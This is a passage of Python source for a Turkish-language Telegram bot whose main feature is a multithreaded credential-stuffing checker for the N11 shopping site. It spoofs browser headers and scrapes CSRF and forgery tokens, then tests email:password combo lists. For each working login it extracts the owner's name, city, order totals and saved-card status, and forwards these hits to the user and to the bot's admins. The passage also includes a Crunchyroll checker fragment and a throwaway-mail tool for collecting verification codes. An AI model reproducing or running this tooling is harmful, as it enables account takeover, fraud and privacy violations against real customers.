    pass
  active_crunchyroll_jobs.pop(user_id, None)
  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (yarıda)" if stopped_early else ""))
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, "CRUNCHYROLL", hits, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early)


def _n11_generate_csrf():
  import base64
  ts = int(time.time() * 1000)
  rand = round(random.uniform(0.1, 0.9999), 4)
  raw = f"{ts}.{rand}"
  return base64.b64encode(raw.encode()).decode().rstrip("=")

def n11_get_session():
  """Hızlı oturum — sadece giriş sayfası + token."""
  ua = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/145.0.0.0 Safari/537.36"
  )
  base_headers = {
    "User-Agent": ua,
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  }
  session = requests.Session()
  session.headers.update(base_headers)
  try:
    response = session.get(
      "https://www.n11.com/giris-yap",
      headers={
        **base_headers,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://www.n11.com/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
      },
      timeout=12,
      allow_redirects=True,
    )
    html = response.text
    csrf = ""
    for pattern in (
      r'"_csrf"\s*:\s*"([A-Za-z0-9+/=]{10,})"',
      r"'_csrf'\s*:\s*'([A-Za-z0-9+/=]{10,})'",
      r'name="_csrf"\s+value="([^"]+)"',
    ):
      m = re.search(pattern, html)
      if m:
        csrf = m.group(1)
        break
    if not csrf:
      csrf = _n11_generate_csrf()

    forgery = ""
    try:
      fr = session.get(
        "https://www.n11.com/api/forgery-token",
        headers={
          **base_headers,
          "Accept": "application/json, text/plain, */*",
          "Referer": "https://www.n11.com/giris-yap",
          "ADRUM": "isAjax:true",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
        },
        timeout=6,
      )
      if fr.status_code == 200:
        try:
          data = fr.json()
          forgery = (
            data.get("forgeryToken")
            or data.get("_forgeryToken")
            or data.get("token")
            or ""
          )
        except Exception:
          m = re.search(
            r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
            fr.text,
            re.I,
          )
          if m:
            forgery = m.group(0)
    except Exception:
      pass

    if not forgery:
      for pattern in (
        r'"_forgeryToken"\s*:\s*"([0-9a-f\-]{30,})"',
        r'forgeryToken["\s:=]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})',
      ):
        m = re.search(pattern, html, re.I)
        if m:
          forgery = m.group(1)
          break
    if not forgery:
      forgery = str(uuid.uuid4())

    ts_ms = int(time.time() * 1000)
    device_id = f"1M{ts_ms}.{random.randint(1000000000, 9999999999)}"
    return {
      "session": session,
      "csrf": csrf,
      "forgery": forgery,
      "device_id": device_id,
    }
  except requests.exceptions.RequestException:
    return None

def n11_get_orders(session):
  """İlk sayfa siparişler (hız için). Toplam sayfa gezilmez."""
  try:
    headers = {
      "ADRUM": "isAjax:true",
      "Accept": "application/json, text/plain, */*",
      "Referer": "https://www.n11.com/hesabim/siparislerim",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/145.0.0.0 Safari/537.36"
      ),
    }
    url = "https://www.n11.com/rest/v1/getProductOrderLightList?listingType=ALL&dateFormat=&pg=1"
    resp = session.get(url, headers=headers, timeout=10)
    if resp.status_code != 200:
      return [], 0
    data = resp.json()
    orders = data.get("orders", []) or []
    pagination = data.get("pagination", {}) or {}
    total_count = int(pagination.get("totalCount") or len(orders) or 0)
    return orders, (total_count if total_count else len(orders))
  except Exception:
    return [], 0

def n11_check_saved_card(session):
  try:
    headers = {
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
      "Content-Length": "0",
      "Origin": "https://www.n11.com",
      "Referer": "https://www.n11.com/hesabim/odeme-seceneklerim",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/151.0.0.0 Safari/537.36"
      ),
    }
    resp = session.post(
      "https://www.n11.com/rest/v1/pointBalanceText",
      headers=headers,
      timeout=6,
    )
    if resp.status_code == 200:
      data = resp.json()
      campaigns = data.get("campaigns", []) or []
      for k in campaigns:
        if k.get("type") == "CARD_SAVE":
          return False
      return True
  except Exception:
    pass
  return None

def n11_check_account(email, password):
  """Returns (status, body, orders, order_count, card_status)."""
  sess_data = n11_get_session()
  if not sess_data:
    return "ERROR", None, None, None, None

  session = sess_data["session"]
  ts_p = int(time.time() * 1000)
  url = f"https://www.n11.com/login?{ts_p}"
  headers = {
    "ADRUM": "isAjax:true",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://www.n11.com",
    "Referer": "https://www.n11.com/giris-yap",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": (
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/145.0.0.0 Safari/537.36"
    ),
    "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  }
  payload = {
    "email": email,
    "password": password,
    "_csrf": sess_data["csrf"],
    "_forgeryToken": sess_data["forgery"],
    "_deviceId": sess_data["device_id"],
    "setEncoding": True,
  }
  try:
    resp = session.post(url, headers=headers, json=payload, timeout=12, allow_redirects=True)
    try:
      body = resp.json()
    except Exception:
      body = {}

    inner = body.get("data", {}) if isinstance(body.get("data"), dict) else body
    error_type = inner.get("errorType", "") if isinstance(inner, dict) else ""
    server_fp = inner.get("fingerPrint", "") if isinstance(inner, dict) else ""

    if error_type == "INVALID_FORGERY_TOKEN" and server_fp:
      payload["_forgeryToken"] = server_fp
      url2 = f"https://www.n11.com/login?{int(time.time() * 1000)}"
      resp = session.post(url2, headers=headers, json=payload, timeout=12, allow_redirects=True)
      try:
        body = resp.json()
      except Exception:
        body = {}
      inner = body.get("data", {}) if isinstance(body.get("data"), dict) else body
      error_type = inner.get("errorType", "") if isinstance(inner, dict) else ""

    status_code = resp.status_code
    text_lower = (resp.text or "").lower()
    CLEAN_BAD = {
      "INVALID_CREDENTIALS",
      "INVALID_USER_CREDENTIALS",
      "WRONG_PASSWORD",
      "USER_NOT_FOUND",
    }
    SUSPENDED = {
      "BUYER_IS_TEMPORARILY_SUSPENDED",
      "BUYER_IS_PERMANENTLY_SUSPENDED",
      "ACCOUNT_SUSPENDED",
      "TEMPORARILY_SUSPENDED",
      "PERMANENTLY_SUSPENDED",
    }
    captcha_signals = [
      "captcha" in text_lower,
      "robot" in text_lower,
      resp.headers.get("cf-mitigated", "") != "",
      status_code == 403,
      error_type == "CAPTCHA_REQUIRED",
    ]
    blr = body.get("buyerLoginResponse") or {}
    has_buyer_data = bool(
      blr.get("buyerId")
      or blr.get("buyerEmail")
      or blr.get("accessToken")
      or blr.get("buyerFirstName")
      or blr.get("buyerLastName")
    )
    redirect_url = body.get("redirectUrl") or ""
    success_signals = [
      has_buyer_data,
      body.get("success") is True,
      bool(redirect_url) and redirect_url not in ("", "null", None),
      "hesabim" in (resp.url or ""),
      "hesabim" in str(redirect_url),
      "dashboard" in (resp.url or ""),
      error_type == "SUCCESS",
      (bool(redirect_url) and error_type == ""),
    ]
    if any(success_signals):
      orders, order_count = n11_get_orders(session)
      if order_count == 0 or not orders:
        return "BAD", None, None, None, None
      card_status = n11_check_saved_card(session)
      return "HIT", body, orders, order_count, card_status
    if any(captcha_signals):
      return "CAPTCHA", None, None, None, None
    if error_type in CLEAN_BAD:
      return "BAD", None, None, None, None
    if error_type in SUSPENDED:
      return "SUSPENDED", body, None, None, None
    if error_type == "ACCOUNT_LOCKED":
      return "LOCKED", body, None, None, None
    if body.get("success") is False or status_code == 401:
      return "BAD", None, None, None, None
    return "ERROR", body, None, None, None
  except requests.exceptions.Timeout:
    return "TIMEOUT", None, None, None, None
  except requests.exceptions.ConnectionError:
    return "ERROR", None, None, None, None
  except Exception:
    return "ERROR", None, None, None, None

def _n11_get(dict_key_pairs):
  for d, keys in dict_key_pairs:
    if not isinstance(d, dict):
      continue
    for k in keys if isinstance(keys, list) else [keys]:
      v = d.get(k)
      if v not in [None, "", "null", "N/A", 0, False]:
        return str(v)
  return "N/A"

def _n11_calc_total_value(orders):
  total = 0.0
  for o in orders or []:
    amount_str = str(o.get("totalAmount", "0") or "0")
    amount_str = re.sub(r"[^\d,\.]", "", amount_str).replace(",", ".")
    try:
      total += float(amount_str)
    except Exception:
      pass
  return total

def _n11_extract_reason(status, body, email=""):
  """API yanıtından okunabilir neden metni."""
  if not isinstance(body, dict):
    return str(status or "Bilinmiyor")
  inner = body.get("data") if isinstance(body.get("data"), dict) else body
  if not isinstance(inner, dict):
    inner = body
  et = (
    inner.get("errorType")
    or body.get("errorType")
    or inner.get("errorCode")
    or ""
  )
  msg = (
    inner.get("errorMessage")
    or inner.get("message")
    or body.get("message")
    or inner.get("error")
    or ""
  )
  if isinstance(msg, dict):
    msg = msg.get("text") or str(msg)
  msg = str(msg or "").strip()[:200]
  et = str(et or "").strip()
  if et and msg:
    return f"{et} — {msg}"
  if et:
    return et
  if msg:
    return msg
  return str(status or "?")

def n11_format_hit(email, password, body, orders, order_count, card_status):
  """Kısa + detay metin (Telegram için)."""
  blr = (body or {}).get("buyerLoginResponse", {}) or {}
  addr = blr.get("selectedAddress", {}) or {}
  fn = _n11_get([(blr, ["buyerFirstName", "firstName", "name", "buyerName"])])
  ln = _n11_get([(blr, ["buyerLastName", "lastName", "surname", "buyerSurname"])])
  name = f"{fn} {ln}".replace("N/A", "").strip() or "N/A"
  city = _n11_get([(addr, ["cityName", "city", "province", "il"])])
  total_val = _n11_calc_total_value(orders)
  if card_status is True:
    card_text = "Kart Var"
  elif card_status is False:
    card_text = "Kart Yok"
  else:
    card_text = "?"
  short = (
    f"{email}:{password} | {name} | {city} | "
    f"Sipariş:{order_count} | {total_val:.2f}TL | {card_text}"
  )
  detail = (
    f"✅ N11 HIT\n"
    f"📧 {email}\n🔑 {password}\n"
    f"👤 {name}\n🏙 {city}\n"
    f"📦 Sipariş: {order_count} | {total_val:.2f} TL\n"
    f"💳 {card_text}"
  )
  return short, detail

def _n11_progress_text(job, finished=False, stopped=False):
  total = int(job.get("total", 0) or 0)
  checked = int(job.get("checked", 0) or 0)
  hits = int(job.get("hits", 0) or 0)
  bads = int(job.get("bads", 0) or 0)
  errors = int(job.get("errors", 0) or 0)
  susp = int(job.get("suspended", 0) or 0)
  pct = int((checked / total) * 100) if total else 0
  bar_len = 12
  filled = int(bar_len * pct / 100) if total else 0
  bar = "█" * filled + "░" * (bar_len - filled)
  head = "✅ Bitti" if finished else ("🛑 Durduruldu" if stopped else "🔍 N11 taranıyor")
  live = job.get("live_log") or []
  live_txt = ""
  if live:
    live_txt = "\n\n📌 **Son olaylar:**\n" + "\n".join(live[-6:])
  return (
    f"{head}\n"
    f"`[{bar}]` **{pct}%**\n"
    f"📦 {checked}/{total}\n"
    f"✅ HIT: **{hits}** · ❌ BAD: **{bads}**\n"
    f"⚠ Askı: **{susp}** · ⚡ Hata: **{errors}**"
    + live_txt
  )

def _n11_live_markup(finished=False, stopped=False):
  markup = types.InlineKeyboardMarkup(row_width=2)
  if not finished and not stopped:
    markup.add(types.InlineKeyboardButton("🛑 Durdur", callback_data="n11_stop"))
  markup.add(
    types.InlineKeyboardButton("✅ HIT'ler", callback_data="n11_show_hits"),
    types.InlineKeyboardButton("⚠ Askılar", callback_data="n11_show_susp"),
  )
  markup.add(
    types.InlineKeyboardButton("⚡ Hatalar", callback_data="n11_show_err"),
    types.InlineKeyboardButton("📋 Son olaylar", callback_data="n11_show_live"),
  )
  return markup

def _n11_stop_markup():
  return _n11_live_markup(False, False)

def _n11_append_live(job, line, limit=12):
  log = job.get("live_log") or []
  log.append(line[:180])
  job["live_log"] = log[-limit:]

def run_n11_check_and_send(chat_id, user_id, text: str):
  """Combo listesi — paralel N11 tarama + canlı HIT/askı/hata paneli."""
  global active_n11_jobs
  if user_id in active_n11_jobs and not active_n11_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten aktif bir N11 taraması var.")
    except Exception:
      pass
    return

  lines = []
  for raw in (text or "").splitlines():
    line = raw.strip()
    if line and ":" in line:
      lines.append(line)
  if not lines and text and ":" in text:
    lines = [text.strip()]

  total = len(lines)
  if total == 0:
    try:
      bot.send_message(chat_id, "❌ Geçerli combo yok. Format: `email:şifre`", parse_mode="Markdown")
    except Exception:
      pass
    return
  if total > 800 and user_id not in admin_ids_set:
    try:
      bot.send_message(chat_id, "❌ Max **800** combo (admin sınırsız).")
    except Exception:
      pass
    return

  workers = get_checker_workers(user_id)

  job = {
    "stop": False,
    "total": total,
    "checked": 0,
    "hits": 0,
    "bads": 0,
    "errors": 0,
    "suspended": 0,
    "chat_id": chat_id,
    "msg_id": None,
    "workers": workers,
    "live_log": [],
    "hit_details": [],
    "susp_details": [],
    "err_details": [],
    "done": False,
  }
  active_n11_jobs[user_id] = job
  try:
    msg = bot.send_message(
      chat_id,
      _n11_progress_text(job) + f"\n⚡ Thread: **{workers}**\n\n"
      f"Butonlarla HIT / askı / hata detayına bak.",
      reply_markup=_n11_live_markup(),
      parse_mode="Markdown",
    )
    job["msg_id"] = msg.message_id
    active_n11_jobs[user_id] = job
  except Exception as e:
    log_error("n11_panel_start", e)

  hits = []
  hit_details = []
  hits_lock = threading.Lock()
  last_ui = [0.0]

  def _refresh(finished=False, stopped=False, force=False):
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_ui[0]) < 1.0:
      return
    last_ui[0] = now
    try:
      markup = _n11_live_markup(finished=finished, stopped=stopped)
      extra = f"\n⚡ Thread: **{workers}**" if not finished and not stopped else ""
      bot.edit_message_text(
        _n11_progress_text(job, finished=finished, stopped=stopped) + extra,
        chat_id,
        mid,
        reply_markup=markup,
        parse_mode="Markdown",
      )
    except Exception:
      pass

  def _check_one(line):
    if active_n11_jobs.get(user_id, {}).get("stop"):
      return None
    parts = line.split(":", 1)
    if len(parts) < 2:
      return ("ERROR", None, "Geçersiz format")
    email, password = parts[0].strip(), parts[1].strip()
    if not email or not password:
      return ("ERROR", None, "Boş email/şifre")
    try:
      status, body, orders, order_count, card_status = n11_check_account(email, password)
    except Exception as e:
      log_error("n11_check_line", e)
      return ("ERROR", None, str(e)[:120])
    reason = _n11_extract_reason(status, body, email)
    if status == "HIT":
      short, detail = n11_format_hit(email, password, body, orders, order_count, card_status)
      return ("HIT", (short, detail), reason)
    return (status, None, reason, email, password)

  from concurrent.futures import ThreadPoolExecutor, as_completed

  stopped_early = False
  try:
    with ThreadPoolExecutor(max_workers=workers) as ex:
      futures = {ex.submit(_check_one, line): line for line in lines}
      for fut in as_completed(futures):
        if active_n11_jobs.get(user_id, {}).get("stop"):
          stopped_early = True
          for f in futures:
            f.cancel()
          break
        try:
          result = fut.result()
        except Exception as e:
          result = ("ERROR", None, str(e)[:80])
        job["checked"] = int(job.get("checked", 0) or 0) + 1
        time.sleep(1.8)  # orta-yavaş — N11 rate limit azalt
        if not result:
          job["errors"] = job.get("errors", 0) + 1
          _n11_append_live(job, "⚡ Hata: boş sonuç")
        else:
          status = result[0]
          if status == "HIT":
            job["hits"] = job.get("hits", 0) + 1
            payload = result[1]
            if payload:
              with hits_lock:
                hits.append(payload[0])
                hit_details.append(payload[1])
                job["hit_details"] = list(hit_details)
            _n11_append_live(job, f"✅ HIT: `{payload[0][:60] if payload else '?'}`")
            try:
              bot.send_message(
                chat_id,
                (payload[1] if payload else "✅ HIT")[:900],
                parse_mode="Markdown",
              )
            except Exception:
              pass
          elif status == "BAD":
            job["bads"] = job.get("bads", 0) + 1
            em = result[3] if len(result) > 3 else "?"
            reason = result[2] if len(result) > 2 else "BAD"
            _n11_append_live(job, f"❌ BAD: `{em}`")
          elif status in ("SUSPENDED", "LOCKED"):
            job["suspended"] = job.get("suspended", 0) + 1
            em = result[3] if len(result) > 3 else "?"
            reason = result[2] if len(result) > 2 else status
            entry = f"⚠ **{status}**\n📧 `{em}`\n📝 {reason}"
            with hits_lock:
              sd = job.get("susp_details") or []
              sd.append(entry)
              job["susp_details"] = sd[-50:]
            _n11_append_live(job, f"⚠ {status}: `{em}` — {str(reason)[:40]}")
            try:
              bot.send_message(chat_id, entry[:800], parse_mode="Markdown")
            except Exception:
              pass
          else:
            job["errors"] = job.get("errors", 0) + 1
            em = result[3] if len(result) > 3 else "?"
            reason = result[2] if len(result) > 2 else status
            entry = f"⚡ **{status}**\n📧 `{em}`\n📝 {reason}"
            with hits_lock:
              ed = job.get("err_details") or []
              ed.append(entry)
              job["err_details"] = ed[-50:]
            _n11_append_live(job, f"⚡ {status}: `{em}` — {str(reason)[:40]}")
        active_n11_jobs[user_id] = job
        _refresh()
  except Exception as e:
    log_error("n11_pool", e)

  stopped_early = stopped_early or bool(active_n11_jobs.get(user_id, {}).get("stop"))
  job["done"] = True
  job["stop"] = stopped_early
  active_n11_jobs[user_id] = job
  _refresh(finished=not stopped_early, stopped=stopped_early, force=True)
  checked = int(job.get("checked", 0) or 0)

  summary = (
    f"🛒 **N11 Tarama Sonucu**\n"
    f"📦 Kontrol: **{checked}/{total}**\n"
    f"✅ HIT: **{len(hits)}** · ❌ BAD: **{job.get('bads', 0)}**\n"
    f"⚠ Askı/Kilit: **{job.get('suspended', 0)}** · ⚡ Hata: **{job.get('errors', 0)}**\n"
    f"⚡ Thread: **{workers}**"
    + ("\n🛑 Yarıda durduruldu" if stopped_early else "")
    + "\n\nButonlardan detay çekebilirsin (HIT / Askı / Hata)."
  )
  try:
    bot.send_message(chat_id, summary, reply_markup=_n11_live_markup(True, stopped_early), parse_mode="Markdown")
  except Exception:
    pass

  job["hits_list"] = list(hits)
  job["hit_details"] = list(hit_details)
  active_n11_jobs[user_id] = job

  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (yarıda kesildi)" if stopped_early else ""))
    except Exception:
      pass
    log_activity("n11_check", user_id, f"total={total} checked={checked} hits=0 workers={workers}")
    return

  temp = f"n11_hits_{user_id}_{int(time.time())}.txt"
  try:
    with open(temp, "w", encoding="utf-8") as f:
      f.write("\n".join(hits) + "\n")
    user_caption = f"✅ **{len(hits)}** N11 HIT\n📦 {checked}/{total}" + (" · 🛑" if stopped_early else "")
    try:
      with open(temp, "rb") as doc:
        bot.send_document(chat_id, doc, caption=user_caption, parse_mode="Markdown")
    except Exception as e:
      log_error("n11_hits_user", e)

    try:
      admin_cap = f"N11 HIT | {user_id} | {len(hits)} | {checked}/{total}"
      for admin_id in list(admin_ids_set):
        if int(admin_id) == int(user_id):
          continue
        try:
          with open(temp, "rb") as doc:
            safe_tg(bot.send_document, admin_id, doc, caption=admin_cap[:1024], retries=1)
        except Exception:
          pass
    except Exception:
      pass

    log_activity("n11_check", user_id, f"total={total} checked={checked} hits={len(hits)} workers={workers}")
  except Exception as e:
    log_error("n11_hits_file", e)
  finally:
    try:
      os.remove(temp)
    except Exception:
      pass
  def _cleanup():
    time.sleep(180)
    j = active_n11_jobs.get(user_id)
    if j and j.get("done"):
      active_n11_jobs.pop(user_id, None)
  threading.Thread(target=_cleanup, daemon=True).start()

MAILTM_BASE = "https://api.mail.tm"

def _mailtm_headers(token=None):
  h = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (compatible; NapimBot/1.0)",
  }
  if token:
    h["Authorization"] = f"Bearer {token}"
  return h

def tempmail_create():
  """
  Yeni geçici mail oluştur.
  Returns: (ok, data_or_error)
  data: {address, password, token}
  """
  try:
    r = requests.get(f"{MAILTM_BASE}/domains", headers=_mailtm_headers(), timeout=15)
    if r.status_code != 200:
      return False, f"Domain alınamadı (HTTP {r.status_code})"
    data = r.json()
    if isinstance(data, list):
      members = data
    elif isinstance(data, dict):
      members = data.get("hydra:member") or data.get("member") or []
    else:
      members = []
    if not members:
      return False, "Uygun domain yok"
    domain = None
    for m in members:
      if not isinstance(m, dict):
        continue
      if m.get("isActive", True):
        domain = m.get("domain")
        if domain:
          break
    if not domain and isinstance(members[0], dict):
      domain = members[0].get("domain")
    if not domain:
      return False, "Domain bulunamadı"

    login = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    address = f"{login}@{domain}"
    password = "".join(random.choices(string.ascii_letters + string.digits, k=14))

    r2 = requests.post(
      f"{MAILTM_BASE}/accounts",
      headers=_mailtm_headers(),
      json={"address": address, "password": password},
      timeout=15,
    )
    if r2.status_code not in (200, 201):
      return False, f"Hesap açılamadı (HTTP {r2.status_code}): {r2.text[:120]}"

    r3 = requests.post(
      f"{MAILTM_BASE}/token",
      headers=_mailtm_headers(),
      json={"address": address, "password": password},
      timeout=15,
    )
    if r3.status_code != 200:
      return False, f"Token alınamadı (HTTP {r3.status_code})"
    token = (r3.json() or {}).get("token")
    if not token:
      return False, "Token boş"
    return True, {"address": address, "password": password, "token": token}
  except Exception as e:
    return False, str(e)

def tempmail_list_messages(token):
  """Gelen kutusu listesi. Returns: (ok, list_or_error)"""
  try:
    r = requests.get(
      f"{MAILTM_BASE}/messages",
      headers=_mailtm_headers(token),
      timeout=15,
    )
    if r.status_code == 401:
      return False, "Oturum düştü — yeni mail al"
    if r.status_code != 200:
      return False, f"HTTP {r.status_code}"
    data = r.json()
    if isinstance(data, list):
      msgs = data
    elif isinstance(data, dict):
      msgs = data.get("hydra:member") or data.get("member") or []
    else:
      msgs = []
    return True, msgs
  except Exception as e:
    return False, str(e)

def tempmail_read_message(token, msg_id):
  """Tek mail oku. Returns: (ok, dict_or_error)"""
  try:
    r = requests.get(
      f"{MAILTM_BASE}/messages/{msg_id}",
      headers=_mailtm_headers(token),
      timeout=15,
    )
    if r.status_code != 200:
      return False, f"HTTP {r.status_code}"
    return True, r.json()
  except Exception as e:
    return False, str(e)

def _extract_codes_from_text(text):
  """Mail içinden olası doğrulama kodlarını çıkar."""
  if not text:
    return []
  codes = []
  for m in re.findall(r"\b(\d{4,8})\b", text):
    if m not in codes:
      codes.append(m)
  for m in re.findall(r"(?:code|kod|otp|pin)\s*[:=\-]?\s*([A-Za-z0-9]{4,10})", text, re.I):
    if m not in codes:
      codes.append(m)
  return codes[:8]

def tempmail_panel_text(user_id):
  cost = int(TEMPMAIL_STAR_COST)
  info = user_temp_mails.get(user_id)
  if not info:
    return (
      f"📧 **Geçici Mail**\n\n"
      f"Henüz mail yok.\n"
      f"🎲 **Yeni Mail Al** → her sefer **{cost}⭐**\n"
      f"(Telegram Stars ile ödeme)"
    )
  addr = info.get("address", "?")
  age = int(time.time() - float(info.get("created", time.time())))
  mins = age // 60
  return (
    f"📧 **Geçici Mail**\n\n"
    f"📬 Adres:\n`{addr}`\n\n"
    f"⏱ Yaş: ~{mins} dk\n"
    f"💡 Bu maili kopyala, sitede kullan.\n"
    f"Kod gelince **Gelen Kutusu**'na bas.\n\n"
    f"🎲 Yeni mail almak: **{cost}⭐** / sefer"
  )

def tempmail_panel_markup(user_id):
  markup = types.InlineKeyboardMarkup(row_width=1)
  has = user_id in user_temp_mails
  markup.add(types.InlineKeyboardButton(f"🎲 Yeni Mail Al ({int(TEMPMAIL_STAR_COST)}⭐)", callback_data="tempmail_new"))
  if has:
    markup.add(types.InlineKeyboardButton("📥 Gelen Kutusu / Kodları Getir", callback_data="tempmail_inbox"))
    markup.add(types.InlineKeyboardButton("🗑 Maili Sil", callback_data="tempmail_delete"))
  markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
  return markup

@bot.message_handler(commands=['admin'])
def admin_support_command(message):
  """/admin: kullaniciyi admin ile canli destek sohbetine alir (ban yok)."""
  user_id = message.from_user.id
  chat_id = message.chat.id
  username = f"@{message.from_user.username}" if message.from_user.username else str(user_id)
  if check_spam(user_id, chat_id, message.from_user.username):
    return
  if is_user_banned(user_id):
    return
  if user_id in admin_ids_set:
    bot.send_message(chat_id, "👑 Zaten yöneticisiniz. Admin Panel ana menüde. Kullanıcılar /admin yazınca size bağlanır.")
    return
  if is_maintenance_blocking(user_id):
    bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
    return
  user_states[chat_id] = "admin_support_chat"
  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton("🚪 Destek Sohbetinden Çık", callback_data="exit_admin_support"))
  bot.send_message(
    chat_id,
    "🎧 **Admin Canlı Destek**\n\nMesajınız yöneticilere iletilir.\nÇıkmak için butona basın veya /iptal yazın.",
    reply_markup=markup,
    parse_mode="Markdown"
  )
  for admin_id in admin_ids_set:
    if admin_id == user_id:
      continue
    try:
      am = types.InlineKeyboardMarkup()
      am.add(types.InlineKeyboardButton("✉️ Yanıtla", callback_data=f"admin_reply_user_{user_id}"))
      bot.send_message(
        admin_id,
        f"🎧 **Yeni destek sohbeti**\n👤 {username}\n🆔 `{user_id}`\n/admin ile bağlandı.",
        reply_markup=am,
        parse_mode="Markdown"
      )
    except Exception:
      pass
  log_activity("admin_support_start", user_id, "cmd")

@bot.message_handler(commands=['cuzdan', 'cüzdan', 'wallet', 'bakiye'])
def wallet_command(message):
  user_id = message.from_user.id
  chat_id = message.chat.id
  if is_user_banned(user_id):
    return
  if is_maintenance_blocking(user_id):
    bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
    return
  ensure_user(user_id, username=message.from_user.username, first_name=message.from_user.first_name)
  claim_gamble_bonus_if_due(user_id)
  bot.send_message(chat_id, get_wallet_text(user_id), parse_mode="Markdown")

@bot.message_handler(commands=['iptal', 'cancel'])
def cancel_command(message):
  chat_id = message.chat.id
  user_id = message.from_user.id
  st = user_states.pop(chat_id, None)
  if st == "admin_support_chat":
    bot.send_message(chat_id, "🚪 Admin destek sohbetinden çıktınız.")
  elif st:
    bot.send_message(chat_id, "❌ İşlem iptal edildi.")
  else:
    bot.send_message(chat_id, "Aktif işlem yok.")

@bot.message_handler(commands=['adminlist'])
def admin_list_command(message):
  """Sadece mevcut adminler admin listesini görür."""
  user_id = message.from_user.id
  if user_id not in admin_ids_set:
    bot.send_message(message.chat.id, "❌ Yetkiniz yok.")
    return
  lines = [f"👑 **Admin listesi** ({len(admin_ids_set)})\n"]
  for aid in sorted(admin_ids_set):
    mark = "⭐" if aid in DEFAULT_ADMINS else "•"
    lines.append(f"{mark} `{aid}`")
  lines.append("\nAdmin çıkarmak: Admin Panel → Admin Çıkar")
  bot.send_message(message.chat.id, "\n".join(lines), parse_mode="Markdown")

@bot.message_handler(commands=['testuyelik', 'checkmember'])
def test_uyelik_command(message):
  """Admin: /testuyelik 123456789 — Telegram API üyelik cevabını gösterir."""
  user_id = message.from_user.id
  if user_id not in admin_ids_set:
    bot.send_message(message.chat.id, "❌ Yetkiniz yok.")
    return
  parts = (message.text or "").split()
  target = int(parts[1]) if len(parts) > 1 and parts[1].lstrip("-").isdigit() else user_id
  lines = [f"🔍 **Üyelik testi** — hedef `{target}`\n"]
  checks = [
    ("Kanal username", CHANNEL_USERNAME),
    ("Kanal ID", CHANNEL_ID),
    ("Chat username", CHAT_USERNAME),
    ("Chat ID", CHAT_ID),
  ]
  for label, ref in checks:
    if not ref:
      lines.append(f"• {label}: _(config'te yok)_")
      continue
    try:
      m = bot.get_chat_member(ref, target)
      ok = m.status in ("member", "administrator", "creator", "restricted")
      lines.append(f"• {label} `{ref}` → **{m.status}** {'✅' if ok else '❌'}")
    except Exception as e:
      lines.append(f"• {label} `{ref}` → ❌ HATA: `{e}`")
  lines.append(
    "\n💡 Grupta `/id` yaz → gelen **chat id**'yi `config.json` içine "
    "`CHAT_ID` olarak yaz (örn: -1001234567890)."
  )
  bot.send_message(message.chat.id, "\n".join(lines), parse_mode="Markdown")

@bot.message_handler(commands=['setchatid'])
def set_chat_id_command(message):
  """Admin: /setchatid -100123...  — chat numeric id kaydet."""
  global CHAT_ID, CONFIG
  user_id = message.from_user.id
  if user_id not in admin_ids_set:
    bot.send_message(message.chat.id, "❌ Yetkiniz yok.")
    return
  parts = (message.text or "").split()
  if len(parts) < 2:
    bot.send_message(message.chat.id, "Kullanım: `/setchatid -1001234567890`", parse_mode="Markdown")
    return
  try:
    cid = int(parts[1])
  except ValueError:
    bot.send_message(message.chat.id, "❌ Geçersiz ID")
    return
  CHAT_ID = cid
  CONFIG["CHAT_ID"] = cid
  try:
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
      json.dump(CONFIG, f, ensure_ascii=False, indent=4)
  except Exception as e:
